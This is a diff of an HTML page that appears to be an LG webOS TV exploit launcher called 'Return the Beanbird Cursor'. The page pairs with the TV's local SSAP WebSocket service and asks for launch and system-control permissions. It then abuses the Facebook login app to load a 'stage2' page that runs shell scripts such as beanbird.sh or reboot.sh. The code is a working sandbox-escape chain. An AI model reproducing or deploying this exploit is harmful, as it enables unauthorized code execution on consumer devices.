@@ -2,51 +2,45 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Beanbird Return</title>
+    <title>Return the Beanbird Cursor</title>
     <style>
-        body { background: #1a1a1a; color: white; text-align: center; font-family: sans-serif; padding-top: 10vh; }
-        .button { padding: 20px; width: 300px; margin: 10px; font-size: 1.2rem; border-radius: 50px; border: none; cursor: pointer; color: white; }
+        body { background: #1a1a1a; color: white; text-align: center; font-family: sans-serif; padding-top: 50px; }
+        .button { padding: 20px 40px; margin: 10px; font-size: 1.2rem; border-radius: 50px; border: none; cursor: pointer; color: white; font-weight: bold; transition: 0.2s; }
         #btn-run { background: #ff0066; border: 2px solid #ff9900; }
-        #log { background: #000; color: #00ff00; width: 80%; height: 150px; margin: 20px auto; padding: 10px; text-align: left; font-family: monospace; border: 1px solid #333; }
+        #btn-reset { background: #444; color: #ccc; }
+        .button:focus { outline: 4px solid #fff; transform: scale(1.05); }
+        #log { background: #000; color: #00ff00; width: 80%; height: 150px; margin: 20px auto; padding: 10px; text-align: left; font-family: monospace; border: 1px solid #333; overflow-y: auto; }
+        .note { border: 1px solid #ffcc00; color: #ffcc00; padding: 10px; display: inline-block; margin: 10px; border-radius: 5px; }
     </style>
 </head>
 <body>
     <h1>Return the Beanbird Cursor</h1>
+    <p>Press the button below and <b>Accept the prompt on your TV screen.</b></p>
+    
     <button id="btn-run" class="button">Return Beanbird Cursor</button>
+    <button id="btn-reset" class="button">Reset to Default</button>
+    <br>
+    <div class="note">Note: TV will be blackscreen for 10-20 seconds during the process.</div>
+    
     <div id="log">Status: Ready.</div>
 
     <script>
-        const logBox = document.getElementById('log');
-        const SITE_URL = window.location.origin;
+        var logBox = document.querySelector('#log');
+        function log(str) { logBox.innerText += '> ' + str + '\n'; logBox.scrollTop = logBox.scrollHeight; }
 
-        function log(m) { logBox.innerHTML += `<br>> ${m}`; logBox.scrollTop = logBox.scrollHeight; }
-
-        // This is the manual request function that talks to the TV
-        var request = function(ws, uri, payload) {
-            ws.send(JSON.stringify({
-                id: "req_" + Math.random().toString(36).substring(2, 9),
-                type: "request",
-                uri: uri,
-                payload: payload
-            }));
-        };
-
-        document.getElementById('btn-run').onclick = function() {
-            log("Connecting to TV...");
+        function startExploit(scriptName) {
+            log("Connecting to SSAP...");
             var ws = new WebSocket('ws://127.0.0.1:3000');
             
             ws.onopen = function() {
-                log("Connection open. Sending Registration...");
-                // This payload triggers the prompt in your screenshot
+                log("Connection open. ACCEPT PROMPT ON TV.");
                 ws.send(JSON.stringify({
                     id: "register_0",
                     type: "register",
                     payload: { 
                         forcePairing: false, 
                         pairingType: "PROMPT", 
-                        manifest: { 
-                            permissions: ["LAUNCH", "SYSTEM_CONTROL", "READ_INSTALLED_APPS"] 
-                        } 
+                        manifest: { permissions: ["LAUNCH", "SYSTEM_CONTROL"] } 
                     }
                 }));
             };
@@ -54,20 +48,25 @@
             ws.onmessage = function(e) {
                 var res = JSON.parse(e.data);
                 if (res.type === "registered") {
-                    log("Authorized! Escaping to Stage 2...");
+                    log("Authorized! Escaping via facebooklogin...");
+                    var stage2Url = window.location.origin + "/stage2.html?run=" + scriptName;
                     
-                    // The "Facebook Login" Escape
-                    var stage2 = SITE_URL + "/stage2.html?run=beanbird.sh";
-                    request(ws, "ssap://system.launcher/launch", {
-                        id: "com.webos.app.facebooklogin",
-                        params: { 
-                            server: stage2.replace(/https?:\/\//, '') + "#" 
+                    // Trigger the social login escape
+                    ws.send(JSON.stringify({
+                        id: "launch_escape",
+                        type: "request",
+                        uri: "ssap://system.launcher/launch",
+                        payload: {
+                            id: "com.webos.app.facebooklogin",
+                            params: { server: stage2Url.replace(/https?:\/\//, '') + "#" }
                         }
-                    });
+                    }));
                 }
             };
-            ws.onerror = function() { log("Error: Ensure LG Connect Apps is ON."); };
-        };
+        }
+
+        document.querySelector('#btn-run').onclick = function() { startExploit('beanbird.sh'); };
+        document.querySelector('#btn-reset').onclick = function() { startExploit('reboot.sh'); };
     </script>
 </body>
 </html>
